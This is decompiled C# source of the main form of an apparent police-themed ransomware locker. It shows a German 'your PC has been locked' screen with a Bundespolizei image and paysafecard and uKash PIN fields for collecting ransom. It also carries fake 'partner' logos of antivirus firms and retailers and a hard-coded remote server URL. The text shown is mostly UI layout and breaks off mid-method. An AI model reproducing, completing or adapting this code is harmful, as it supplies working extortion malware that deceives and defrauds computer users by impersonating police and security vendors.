using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using ns0;
using ns2;
using ns3;
using ns4;
using ns5;

namespace ns1;

internal class frmMain : Form
{
	private IContainer icontainer_0;

	private PictureBox pictureBox_0;

	private Label label_0;

	private RichTextBox richTextBox_0;

	private Label label_1;

	private TrackBar trackBar_0;

	private Label label_2;

	private Label label_3;

	private RichTextBox richTextBox_1;

	private Label label_4;

	private PictureBox pictureBox_1;

	private GroupBox groupBox_0;

	private RadioButton radioButton_0;

	private Button button_0;

	private TextBox textBox_0;

	private Label label_5;

	private RadioButton radioButton_1;

	private Button button_1;

	private PictureBox pictureBox_2;

	private PictureBox pictureBox_3;

	private PictureBox pictureBox_4;

	private PictureBox pictureBox_5;

	private PictureBox pictureBox_6;

	private PictureBox pictureBox_7;

	private PictureBox pictureBox_8;

	private GroupBox groupBox_1;

	private PictureBox pictureBox_9;

	private PictureBox pictureBox_10;

	private PictureBox pictureBox_11;

	private GroupBox groupBox_2;

	private PictureBox pictureBox_12;

	private GroupBox groupBox_3;

	private Timer timer_0;

	private TextBox textBox_1;

	private PictureBox pictureBox_13;

	private Label label_6;

	private TextBox textBox_2;

	private PictureBox pictureBox_14;

	private Stopwatch stopwatch_0;

	private Clock clock_0;

	private Thread thread_0;

	private Class11 class11_0;

	public string string_0;

	private string[] string_1;

	public bool bool_0;

	public string string_2;

	private WebClient webClient_0;

	public frmMain()
	{
		//IL_0025: Unknown result type (might be due to invalid IL or missing references)
		//IL_002f: Expected O, but got Unknown
		((Control)this).add_HandleCreated((EventHandler)frmMain_HandleCreated);
		stopwatch_0 = new Stopwatch();
		clock_0 = new Clock();
		thread_0 = new Thread(Class5.smethod_0);
		class11_0 = new Class11();
		string_0 = string.Empty;
		bool_0 = true;
		string_2 = "http://bp-connect.biz/";
		webClient_0 = new WebClient();
		InitializeComponent();
	}

	void Form.Dispose(bool disposing)
	{
		try
		{
			if (disposing && icontainer_0 != null)
			{
				icontainer_0.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	private void InitializeComponent()
	{
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_0069: Unknown result type (might be due to invalid IL or missing references)
		//IL_0073: Expected O, but got Unknown
		//IL_0074: Unknown result type (might be due to invalid IL or missing references)
		//IL_007e: Expected O, but got Unknown
		//IL_007f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0089: Expected O, but got Unknown
		//IL_008a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0094: Expected O, but got Unknown
		//IL_0095: Unknown result type (might be due to invalid IL or missing references)
		//IL_009f: Expected O, but got Unknown
		//IL_00a0: Unknown result type (might be due to invalid IL or missing references)
		//IL_00aa: Expected O, but got Unknown
		//IL_00ab: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b5: Expected O, but got Unknown
		//IL_00b6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c0: Expected O, but got Unknown
		//IL_00c1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00cb: Expected O, but got Unknown
		//IL_00cc: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d6: Expected O, but got Unknown
		//IL_00d7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e1: Expected O, but got Unknown
		//IL_00e2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ec: Expected O, but got Unknown
		//IL_00ed: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f7: Expected O, but got Unknown
		//IL_00f8: Unknown result type (might be due to invalid IL or missing references)
		//IL_0102: Expected O, but got Unknown
		//IL_0103: Unknown result type (might be due to invalid IL or missing references)
		//IL_010d: Expected O, but got Unknown
		//IL_010e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0118: Expected O, but got Unknown
		//IL_0119: Unknown result type (might be due to invalid IL or missing references)
		//IL_0123: Expected O, but got Unknown
		//IL_0124: Unknown result type (might be due to invalid IL or missing references)
		//IL_012e: Expected O, but got Unknown
		//IL_012f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0139: Expected O, but got Unknown
		//IL_013a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0144: Expected O, but got Unknown
		//IL_0145: Unknown result type (might be due to invalid IL or missing references)
		//IL_014f: Expected O, but got Unknown
		//IL_0150: Unknown result type (might be due to invalid IL or missing references)
		//IL_015a: Expected O, but got Unknown
		//IL_015b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0165: Expected O, but got Unknown
		//IL_0166: Unknown result type (might be due to invalid IL or missing references)
		//IL_0170: Expected O, but got Unknown
		//IL_0171: Unknown result type (might be due to invalid IL or missing references)
		//IL_017b: Expected O, but got Unknown
		//IL_017c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0186: Expected O, but got Unknown
		//IL_0187: Unknown result type (might be due to invalid IL or missing references)
		//IL_0191: Expected O, but got Unknown
		//IL_0192: Unknown result type (might be due to invalid IL or missing references)
		//IL_019c: Expected O, but got Unknown
		//IL_01a3: Unknown result type (might be due to invalid IL or missing references)
		//IL_01ad: Expected O, but got Unknown
		//IL_01ae: Unknown result type (might be due to invalid IL or missing references)
		//IL_01b8: Expected O, but got Unknown
		//IL_02c6: Unknown result type (might be due to invalid IL or missing references)
		//IL_02d0: Expected O, but got Unknown
		//IL_0360: Unknown result type (might be due to invalid IL or missing references)
		//IL_036a: Expected O, but got Unknown
		//IL_040a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0414: Expected O, but got Unknown
		//IL_052b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0535: Expected O, but got Unknown
		//IL_05c4: Unknown result type (might be due to invalid IL or missing references)
		//IL_05ce: Expected O, but got Unknown
		//IL_0658: Unknown result type (might be due to invalid IL or missing references)
		//IL_0662: Expected O, but got Unknown
		//IL_06f3: Unknown result type (might be due to invalid IL or missing references)
		//IL_06fd: Expected O, but got Unknown
		//IL_08d4: Unknown result type (might be due to invalid IL or missing references)
		//IL_08de: Expected O, but got Unknown
		//IL_0a51: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a5b: Expected O, but got Unknown
		//IL_14c4: Unknown result type (might be due to invalid IL or missing references)
		//IL_14ce: Expected O, but got Unknown
		//IL_1685: Unknown result type (might be due to invalid IL or missing references)
		//IL_168f: Expected O, but got Unknown
		icontainer_0 = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(frmMain));
		vmethod_3(new Label());
		vmethod_5(new RichTextBox());
		vmethod_7(new Label());
		vmethod_9(new TrackBar());
		vmethod_11(new Label());
		vmethod_13(new Label());
		vmethod_15(new RichTextBox());
		vmethod_17(new Label());
		vmethod_21(new GroupBox());
		vmethod_69(new Label());
		vmethod_71(new TextBox());
		vmethod_67(new PictureBox());
		vmethod_29(new Label());
		vmethod_33(new Button());
		vmethod_31(new RadioButton());
		vmethod_25(new Button());
		vmethod_27(new TextBox());
		vmethod_23(new RadioButton());
		vmethod_19(new PictureBox());
		vmethod_49(new GroupBox());
		vmethod_53(new PictureBox());
		vmethod_55(new PictureBox());
		vmethod_51(new PictureBox());
		vmethod_35(new PictureBox());
		vmethod_47(new PictureBox());
		vmethod_37(new PictureBox());
		vmethod_45(new PictureBox());
		vmethod_39(new PictureBox());
		vmethod_43(new PictureBox());
		vmethod_41(new PictureBox());
		vmethod_57(new GroupBox());
		vmethod_73(new PictureBox());
		vmethod_59(new PictureBox());
		vmethod_61(new GroupBox());
		vmethod_65(new TextBox());
		vmethod_63(new Timer(icontainer_0));
		vmethod_1(new PictureBox());
		((ISupportInitialize)vmethod_8()).BeginInit();
		((Control)vmethod_20()).SuspendLayout();
		((ISupportInitialize)vmethod_66()).BeginInit();
		((ISupportInitialize)vmethod_18()).BeginInit();
		((Control)vmethod_48()).SuspendLayout();
		((ISupportInitialize)vmethod_52()).BeginInit();
		((ISupportInitialize)vmethod_54()).BeginInit();
		((ISupportInitialize)vmethod_50()).BeginInit();
		((ISupportInitialize)vmethod_34()).BeginInit();
		((ISupportInitialize)vmethod_46()).BeginInit();
		((ISupportInitialize)vmethod_36()).BeginInit();
		((ISupportInitialize)vmethod_44()).BeginInit();
		((ISupportInitialize)vmethod_38()).BeginInit();
		((ISupportInitialize)vmethod_42()).BeginInit();
		((ISupportInitialize)vmethod_40()).BeginInit();
		((Control)vmethod_56()).SuspendLayout();
		((ISupportInitialize)vmethod_72()).BeginInit();
		((ISupportInitialize)vmethod_58()).BeginInit();
		((Control)vmethod_60()).SuspendLayout();
		((ISupportInitialize)vmethod_0()).BeginInit();
		((Control)this).SuspendLayout();
		((Control)vmethod_2()).set_Anchor((AnchorStyles)13);
		vmethod_2().set_AutoSize(true);
		((Control)vmethod_2()).set_Font(new Font("Arial", 14f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		Label obj = vmethod_2();
		Point location = new Point(433, 9);
		((Control)obj).set_Location(location);
		((Control)vmethod_2()).set_Name("lblZugangGesperrt");
		Label obj2 = vmethod_2();
		Size size = new Size(387, 22);
		((Control)obj2).set_Size(size);
		((Control)vmethod_2()).set_TabIndex(1);
		vmethod_2().set_Text("Der Zugang zu ihrem PC wurde gesperrt.");
		((Control)vmethod_4()).set_Anchor((AnchorStyles)13);
		((TextBoxBase)vmethod_4()).set_BackColor(Color.DarkGray);
		vmethod_4().set_Font(new Font("Microsoft Sans Serif", 10f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		RichTextBox obj3 = vmethod_4();
		location = new Point(437, 43);
		((Control)obj3).set_Location(location);
		((Control)vmethod_4()).set_Name("rtbWarnung");
		((TextBoxBase)vmethod_4()).set_ReadOnly(true);
		RichTextBox obj4 = vmethod_4();
		size = new Size(1191, 299);
		((Control)obj4).set_Size(size);
		((Control)vmethod_4()).set_TabIndex(2);
		vmethod_4().set_Text(componentResourceManager.GetString("rtbWarnung.Text"));
		((Control)vmethod_6()).set_Anchor((AnchorStyles)6);
		vmethod_6().set_AutoSize(true);
		((Control)vmethod_6()).set_Font(new Font("Microsoft Sans Serif", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		Label obj5 = vmethod_6();
		location = new Point(12, 877);
		((Control)obj5).set_Location(location);
		((Control)vmethod_6()).set_Name("lblOpacity");
		Label obj6 = vmethod_6();
		size = new Size(97, 20);
		((Control)obj6).set_Size(size);
		((Control)vmethod_6()).set_TabIndex(3);
		vmethod_6().set_Text("Sichtbarkeit:");
		((Control)vmethod_8()).set_Anchor((AnchorStyles)6);
		((Control)vmethod_8()).set_Enabled(false);
		TrackBar obj7 = vmethod_8();
		location = new Point(8, 902);
		((Control)obj7).set_Location(location);
		vmethod_8().set_Maximum(100);
		vmethod_8().set_Minimum(65);
		((Control)vmethod_8()).set_Name("tbOpacity");
		TrackBar obj8 = vmethod_8();
		size = new Size(188, 45);
		((Control)obj8).set_Size(size);
		((Control)vmethod_8()).set_TabIndex(4);
		vmethod_8().set_Value(100);
		((Control)vmethod_10()).set_Anchor((AnchorStyles)10);
		vmethod_10().set_AutoSize(true);
		((Control)vmethod_10()).set_Font(new Font("Microsoft Sans Serif", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		Label obj9 = vmethod_10();
		location = new Point(1495, 873);
		((Control)obj9).set_Location(location);
		((Control)vmethod_10()).set_Name("lblTime");
		Label obj10 = vmethod_10();
		size = new Size(132, 20);
		((Control)obj10).set_Size(size);
		((Control)vmethod_10()).set_TabIndex(5);
		vmethod_10().set_Text("Vergangene Zeit:");
		((Control)vmethod_12()).set_Anchor((AnchorStyles)10);
		vmethod_12().set_AutoSize(true);
		((Control)vmethod_12()).set_Font(new Font("Microsoft Sans Serif", 10f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		Label obj11 = vmethod_12();
		location = new Point(43, 92);
		((Control)obj11).set_Location(location);
		((Control)vmethod_12()).set_Name("lblTimePassed");
		Label obj12 = vmethod_12();
		size = new Size(64, 17);
		((Control)obj12).set_Size(size);
		((Control)vmethod_12()).set_TabIndex(6);
		vmethod_12().set_Text("00:00:00");
		((Control)vmethod_14()).set_Anchor((AnchorStyles)13);
		((TextBoxBase)vmethod_14()).set_BackColor(Color.DarkGray);
		vmethod_14().set_Font(new Font("Microsoft Sans Serif", 10f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		RichTextBox obj13 = vmethod_14();
		location = new Point(10, 373);
		((Control)obj13).set_Location(location);
		((Control)vmethod_14()).set_Name("rtbInfo");
		((TextBoxBase)vmethod_14()).set_ReadOnly(true);
		RichTextBox obj14 = vmethod_14();
		size = new Size(1620, 122);
		((Control)obj14).set_Size(size);
		((Control)vmethod_14()).set_TabIndex(7);
		vmethod_14().set_Text(componentResourceManager.GetString("rtbInfo.Text"));
		vmethod_16().set_AutoSize(true);
		((Control)vmethod_16()).set_Font(new Font("Microsoft Sans Serif", 8.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		Label obj15 = vmethod_16();
		location = new Point(7, 357);
		((Control)obj15).set_Location(location);
		((Control)vmethod_16()).set_Name("lblInfo");
		Label obj16 = vmethod_16();
		size = new Size(33, 13);
		((Control)obj16).set_Size(size);
		((Control)vmethod_16()).set_TabIndex(8);
		vmethod_16().set_Text("Info:");
		((Control)vmethod_20()).set_Anchor((AnchorStyles)15);
		((Control)vmethod_20()).get_Controls().Add((Control)(object)vmethod_68());
		((Control)vmethod_20()).get_Controls().Add((Control)(object)vmethod_70());
		((Control)vmethod_20()).get_Controls().Add((Control)(object)vmethod_66());
		((Control)vmethod_20()).get_Controls().Add((Control)(object)vmethod_28());
		((Control)vmethod_20()).get_Controls().Add((Control)(object)vmethod_32());
		((Control)vmethod_20()).get_Controls().Add((Control)(object)vmethod_30());
		((Control)vmethod_20()).get_Controls().Add((Control)(object)vmethod_24());
		((Control)vmethod_20()).get_Controls().Add((Control)(object)vmethod_26());
		((Control)vmethod_20()).get_Controls().Add((Control)(object)vmethod_22());
		((Control)vmethod_20()).get_Controls().Add((Control)(object)vmethod_18());
		GroupBox obj17 = vmethod_20();
		location = new Point(536, 501);
		((Control)obj17).set_Location(location);
		((Control)vmethod_20()).set_Name("gbPayment");
		GroupBox obj18 = vmethod_20();
		size = new Size(509, 446);
		((Control)obj18).set_Size(size);
		((Control)vmethod_20()).set_TabIndex(11);
		vmethod_20().set_TabStop(false);
		vmethod_20().set_Text("Zahlungsarten");
		vmethod_68().set_AutoSize(true);
		((Control)vmethod_68()).set_Font(new Font("Microsoft Sans Serif", 9f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		Label obj19 = vmethod_68();
		location = new Point(94, 306);
		((Control)obj19).set_Location(location);
		((Control)vmethod_68()).set_Name("lbluKashPIN");
		Label obj20 = vmethod_68();
		size = new Size(30, 15);
		((Control)obj20).set_Size(size);
		((Control)vmethod_68()).set_TabIndex(37);
		vmethod_68().set_Text("PIN:");
		((Control)vmethod_70()).set_Enabled(false);
		TextBox obj21 = vmethod_70();
		location = new Point(148, 305);
		((Control)obj21).set_Location(location);
		((TextBoxBase)vmethod_70()).set_MaxLength(19);
		((Control)vmethod_70()).set_Name("txtuKashCode");
		TextBox obj22 = vmethod_70();
		size = new Size(218, 20);
		((Control)obj22).set_Size(size);
		((Control)vmethod_70()).set_TabIndex(38);
		vmethod_70().set_Text("Format: 0000000000000000000");
		vmethod_66().set_Image((Image)(object)Class18.smethod_17());
		PictureBox obj23 = vmethod_66();
		location = new Point(124, 229);
		((Control)obj23).set_Location(location);
		((Control)vmethod_66()).set_Name("PictureBox1");
		PictureBox obj24 = vmethod_66();
		size = new Size(221, 58);
		((Control)obj24).set_Size(size);
		vmethod_66().set_SizeMode((PictureBoxSizeMode)1);
		vmethod_66().set_TabIndex(36);
		vmethod_66().set_TabStop(false);
		vmethod_28().set_AutoSize(true);
		((Control)vmethod_28()).set_Font(new Font("Microsoft Sans Serif", 9f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		Label obj25 = vmethod_28();
		location = new Point(94, 121);
		((Control)obj25).set_Location(location);
		((Control)vmethod_28()).set_Name("lblTextPIN");
		Label obj26 = vmethod_28();
		size = new Size(30, 15);
		((Control)obj26).set_Size(size);
		((Control)vmethod_28()).set_TabIndex(11);
		vmethod_28().set_Text("PIN:");
		((Control)vmethod_32()).set_Enabled(false);
		Button obj27 = vmethod_32();
		location = new Point(368, 306);
		((Control)obj27).set_Location(location);
		((Control)vmethod_32()).set_Name("btnZahlenuKash");
		Button obj28 = vmethod_32();
		size = new Size(37, 19);
		((Control)obj28).set_Size(size);
		((Control)vmethod_32()).set_TabIndex(35);
		((ButtonBase)vmethod_32()).set_Text("OK");
		((ButtonBase)vmethod_32()).set_UseVisualStyleBackColor(true);
		((ButtonBase)vmethod_30()).set_AutoSize(true);
		RadioButton obj29 = vmethod_30();
		location = new Point(97, 251);
		((Control)obj29).set_Location(location);
		((Control)vmethod_30()).set_Name("rdbuKash");
		RadioButton obj30 = vmethod_30();
		size = new Size(14, 13);
		((Control)obj30).set_Size(size);
		((Control)vmethod_30()).set_TabIndex(17);
		vmethod_30().set_TabStop(true);
		((ButtonBase)vmethod_30()).set_UseVisualStyleBackColor(true);
		((Control)vmethod_24()).set_Enabled(false);
		Button obj31 = vmethod_24();
		location = new Point(368, 117);
		((Control)obj31).set_Location(location);
		((Control)vmethod_24()).set_Name("btnOk");
		Button obj32 = vmethod_24();
		size = new Size(37, 20);
		((Control)obj32).set_Size(size);
		((Control)vmethod_24()).set_TabIndex(13);
		((ButtonBase)vmethod_24()).set_Text("OK");
		((ButtonBase)vmethod_24()).set_UseVisualStyleBackColor(true);
		((Control)vmethod_26()).set_Enabled(false);
		TextBox obj33 = vmethod_26();
		location = new Point(148, 117);
		((Control)obj33).set_Location(location);
		((TextBoxBase)vmethod_26()).set_MaxLength(20);
		((Control)vmethod_26()).set_Name("txtPSC");
		TextBox obj34 = vmethod_26();
		size = new Size(218, 20);
		((Control)obj34).set_Size(size);
		((Control)vmethod_26()).set_TabIndex(12);
		vmethod_26().set_Text("Format: 0000-0000-0000-0000");
		((ButtonBase)vmethod_22()).set_AutoSize(true);
		RadioButton obj35 = vmethod_22();
		location = new Point(97, 68);
		((Control)obj35).set_Location(location);
		((Control)vmethod_22()).set_Name("rdbPaysafe");
		RadioButton obj36 = vmethod_22();
		size = new Size(14, 13);
		((Control)obj36).set_Size(size);
		((Control)vmethod_22()).set_TabIndex(10);
		vmethod_22().set_TabStop(true);
		((ButtonBase)vmethod_22()).set_UseVisualStyleBackColor(true);
		vmethod_18().set_Image((Image)(object)Class18.smethod_13());
		PictureBox obj37 = vmethod_18();
		location = new Point(124, 49);
		((Control)obj37).set_Location(location);
		((Control)vmethod_18()).set_Name("pbPaysafecard");
		PictureBox obj38 = vmethod_18();
		size = new Size(221, 58);
		((Control)obj38).set_Size(size);
		vmethod_18().set_SizeMode((PictureBoxSizeMode)2);
		vmethod_18().set_TabIndex(9);
		vmethod_18().set_TabStop(false);
		((Control)vmethod_48()).set_Anchor((AnchorStyles)10);
		((Control)vmethod_48()).get_Controls().Add((Control)(object)vmethod_52());
		((Control)vmethod_48()).get_Controls().Add((Control)(object)vmethod_54());
		((Control)vmethod_48()).get_Controls().Add((Control)(object)vmethod_50());
		((Control)vmethod_48()).get_Controls().Add((Control)(object)vmethod_34());
		((Control)vmethod_48()).get_Controls().Add((Control)(object)vmethod_46());
		((Control)vmethod_48()).get_Controls().Add((Control)(object)vmethod_36());
		((Control)vmethod_48()).get_Controls().Add((Control)(object)vmethod_44());
		((Control)vmethod_48()).get_Controls().Add((Control)(object)vmethod_38());
		((Control)vmethod_48()).get_Controls().Add((Control)(object)vmethod_42());
		((Control)vmethod_48()).get_Controls().Add((Control)(object)vmethod_40());
		GroupBox obj39 = vmethod_48();
		location = new Point(1067, 533);
		((Control)obj39).set_Location(location);
		((Control)vmethod_48()).set_Name("gbPartners");
		GroupBox obj40 = vmethod_48();
		size = new Size(413, 416);
		((Control)obj40).set_Size(size);
		((Control)vmethod_48()).set_TabIndex(32);
		vmethod_48().set_TabStop(false);
		vmethod_48().set_Text("In Zusammenarbeit mit:");
		((Control)vmethod_52()).set_Anchor((AnchorStyles)10);
		vmethod_52().set_Image((Image)(object)Class18.smethod_7());
		PictureBox obj41 = vmethod_52();
		location = new Point(297, 21);
		((Control)obj41).set_Location(location);
		((Control)vmethod_52()).set_Name("pbFSecure");
		PictureBox obj42 = vmethod_52();
		size = new Size(83, 91);
		((Control)obj42).set_Size(size);
		vmethod_52().set_SizeMode((PictureBoxSizeMode)1);
		vmethod_52().set_TabIndex(34);
		vmethod_52().set_TabStop(false);
		((Control)vmethod_54()).set_Anchor((AnchorStyles)10);
		vmethod_54().set_Image((Image)(object)Class18.smethod_8());
		PictureBox obj43 = vmethod_54();
		location = new Point(162, 21);
		((Control)obj43).set_Location(location);
		((Control)vmethod_54()).set_Name("pbKaspersky");
		PictureBox obj44 = vmethod_54();
		size = new Size(83, 91);
		((Control)obj44).set_Size(size);
		vmethod_54().set_SizeMode((PictureBoxSizeMode)1);
		vmethod_54().set_TabIndex(33);
		vmethod_54().set_TabStop(false);
		((Control)vmethod_50()).set_Anchor((AnchorStyles)10);
		vmethod_50().set_Image((Image)(object)Class18.smethod_3());
		PictureBox obj45 = vmethod_50();
		location = new Point(28, 21);
		((Control)obj45).set_Location(location);
		((Control)vmethod_50()).set_Name("pbAvira");
		PictureBox obj46 = vmethod_50();
		size = new Size(83, 91);
		((Control)obj46).set_Size(size);
		vmethod_50().set_SizeMode((PictureBoxSizeMode)1);
		vmethod_50().set_TabIndex(32);
		vmethod_50().set_TabStop(false);
		((Control)vmethod_34()).set_Anchor((AnchorStyles)10);
		vmethod_34().set_Image((Image)(object)Class18.smethod_4());
		PictureBox obj47 = vmethod_34();
		location = new Point(162, 285);
		((Control)obj47).set_Location(location);
		((Control)vmethod_34()).set_Name("pbHAutomat");
		PictureBox obj48 = vmethod_34();
		size = new Size(81, 122);
		((Control)obj48).set_Size(size);
		vmethod_34().set_SizeMode((PictureBoxSizeMode)1);
		vmethod_34().set_TabIndex(31);
		vmethod_34().set_TabStop(false);
		((Control)vmethod_46()).set_Anchor((AnchorStyles)10);
		vmethod_46().set_Image((Image)(object)Class18.smethod_16());
		PictureBox obj49 = vmethod_46();
		location = new Point(76, 154);
		((Control)obj49).set_Location(location);
		((Control)vmethod_46()).set_Name("pbRossmann");
		PictureBox obj50 = vmethod_46();
		size = new Size(254, 53);
		((Control)obj50).set_Size(size);
		vmethod_46().set_SizeMode((PictureBoxSizeMode)1);
		vmethod_46().set_TabIndex(25);
		vmethod_46().set_TabStop(false);
		((Control)vmethod_36()).set_Anchor((AnchorStyles)10);
		vmethod_36().set_Image((Image)(object)Class18.smethod_12());
		PictureBox obj51 = vmethod_36();
		location = new Point(249, 285);
		((Control)obj51).set_Location(location);
		((Control)vmethod_36()).set_Name("pbOMV");
		PictureBox obj52 = vmethod_36();
		size = new Size(81, 66);
		((Control)obj52).set_Size(size);
		vmethod_36().set_SizeMode((PictureBoxSizeMode)1);
		vmethod_36().set_TabIndex(30);
		vmethod_36().set_TabStop(false);
		((Control)vmethod_44()).set_Anchor((AnchorStyles)10);
		vmethod_44().set_Image((Image)(object)Class18.smethod_1());
		PictureBox obj53 = vmethod_44();
		location = new Point(76, 213);
		((Control)obj53).set_Location(location);
		((Control)vmethod_44()).set_Name("pbAgip");
		PictureBox obj54 = vmethod_44();
		size = new Size(81, 66);
		((Control)obj54).set_Size(size);
		vmethod_44().set_SizeMode((PictureBoxSizeMode)1);
		vmethod_44().set_TabIndex(26);
		vmethod_44().set_TabStop(false);
		((Control)vmethod_38()).set_Anchor((AnchorStyles)10);
		vmethod_38().set_Image((Image)(object)Class18.smethod_9());
		PictureBox obj55 = vmethod_38();
		location = new Point(76, 285);
		((Control)obj55).set_Location(location);
		((Control)vmethod_38()).set_Name("pbNetto");
		PictureBox obj56 = vmethod_38();
		size = new Size(81, 66);
		((Control)obj56).set_Size(size);
		vmethod_38().set_SizeMode((PictureBoxSizeMode)1);
		vmethod_38().set_TabIndex(29);
		vmethod_38().set_TabStop(false);
		((Control)vmethod_42()).set_Anchor((AnchorStyles)10);
		vmethod_42().set_Image((Image)(object)Class18.smethod_2());
		PictureBox obj57 = vmethod_42();
		location = new Point(162, 213);
		((Control)obj57).set_Location(location);
		((Control)vmethod_42()).set_Name("pbAral");
		PictureBox obj58 = vmethod_42();
		size = new Size(81, 66);
		((Control)obj58).set_Size(size);
		vmethod_42().set_SizeMode((PictureBoxSizeMode)1);
		vmethod_42().set_TabIndex(27);
		vmethod_42().set_TabStop(false);
		((Control)vmethod_40()).set_Anchor((AnchorStyles)10);
		vmethod_40().set_Image((Image)(object)Class18.smethod_6());
		PictureBox obj59 = vmethod_40();
		location = new Point(249, 213);
		((Control)obj59).set_Location(location);
		((Control)vmethod_40()).set_Name("pbEsso");
		PictureBox obj60 = vmethod_40();
		size = new Size(81, 66);
		((Control)obj60).set_Size(size);
		vmethod_40().set_SizeMode((PictureBoxSizeMode)1);
		vmethod_40().set_TabIndex(28);
		vmethod_40().set_TabStop(false);
		((Control)vmethod_56()).set_Anchor((AnchorStyles)6);
		((Control)vmethod_56()).get_Controls().Add((Control)(object)vmethod_72());
		((Control)vmethod_56()).get_Controls().Add((Control)(object)vmethod_58());
		GroupBox obj61 = vmethod_56();
		location = new Point(237, 533);
		((Control)obj61).set_Location(location);
		((Control)vmethod_56()).set_Name("gbPayInfo");
		GroupBox obj62 = vmethod_56();
		size = new Size(276, 416);
		((Control)obj62).set_Size(size);
		((Control)vmethod_56()).set_TabIndex(33);
		vmethod_56().set_TabStop(false);
		vmethod_56().set_Text("Zahlungsinformationen:");
		((Control)vmethod_56()).set_Visible(false);
		vmethod_72().set_Image((Image)componentResourceManager.GetObject("pbuKash.Image"));
		PictureBox obj63 = vmethod_72();
		location = new Point(70, 46);
		((Control)obj63).set_Location(location);
		((Control)vmethod_72()).set_Name("pbuKash");
		PictureBox obj64 = vmethod_72();
		size = new Size(141, 328);
		((Control)obj64).set_Size(size);
		vmethod_72().set_SizeMode((PictureBoxSizeMode)1);
		vmethod_72().set_TabIndex(1);
		vmethod_72().set_TabStop(false);
		((Control)vmethod_72()).set_Visible(false);
		vmethod_58().set_Image((Image)(object)Class18.smethod_14());
		PictureBox obj65 = vmethod_58();
		location = new Point(70, 46);
		((Control)obj65).set_Location(location);
		((Control)vmethod_58()).set_Name("pbPayInfo");
		PictureBox obj66 = vmethod_58();
		size = new Size(141, 328);
		((Control)obj66).set_Size(size);
		vmethod_58().set_SizeMode((PictureBoxSizeMode)2);
		vmethod_58().set_TabIndex(0);
		vmethod_58().set_TabStop(false);
		((Control)vmethod_58()).set_Visible(false);
		((Control)vmethod_60()).set_Anchor((AnchorStyles)10);
		((Control)vmethod_60()).get_Controls().Add((Control)(object)vmethod_64());
		((Control)vmethod_60()).get_Controls().Add((Control)(object)vmethod_12());
		GroupBox obj67 = vmethod_60();
		location = new Point(1486, 807);
		((Control)obj67).set_Location(location);
		((Control)vmethod_60()).set_Name("GroupBox1");
		GroupBox obj68 = vmethod_60();
		size = new Size(146, 142);
		((Control)obj68).set_Size(size);
		((Control)vmethod_60()).set_TabIndex(35);
		vmethod_60().set_TabStop(false);
		vmethod_60().set_Text("Status");
		((Control)vmethod_64()).set_Font(new Font("Microsoft Sans Serif", 7f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		TextBox obj69 = vmethod_64();
		location = new Point(13, 25);
		((Control)obj69).set_Location(location);
		((Control)vmethod_64()).set_Name("txtStatus");
		((TextBoxBase)vmethod_64()).set_ReadOnly(true);
		TextBox obj70 = vmethod_64();
		size = new Size(117, 18);
		((Control)obj70).set_Size(size);
		((Control)vmethod_64()).set_TabIndex(36);
		vmethod_64().set_Text("Warte...");
		vmethod_62().set_Interval(1000);
		vmethod_0().set_Image((Image)(object)Class18.smethod_5());
		PictureBox obj71 = vmethod_0();
		location = new Point(1, -2);
		((Control)obj71).set_Location(location);
		((Control)vmethod_0()).set_Name("pbBundespolizei");
		PictureBox obj72 = vmethod_0();
		size = new Size(426, 344);
		((Control)obj72).set_Size(size);
		vmethod_0().set_SizeMode((PictureBoxSizeMode)1);
		vmethod_0().set_TabIndex(0);
		vmethod_0().set_TabStop(false);
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_BackColor(Color.Gray);
		size = new Size(1640, 957);
		((Form)this).set_ClientSize(size);
		((Control)this).get_Controls().Add((Control)(object)vmethod_56());
		((Control)this).get_Controls().Add((Control)(object)vmethod_20());
		((Control)this).get_Controls().Add((Control)(object)vmethod_16());
		((Control)this).get_Controls().Add((Control)(object)vmethod_14());
		((Control)this).get_Controls().Add((Control)(object)vmethod_10());
		((Control)this).get_Controls().Add((Control)(object)vmethod_8());
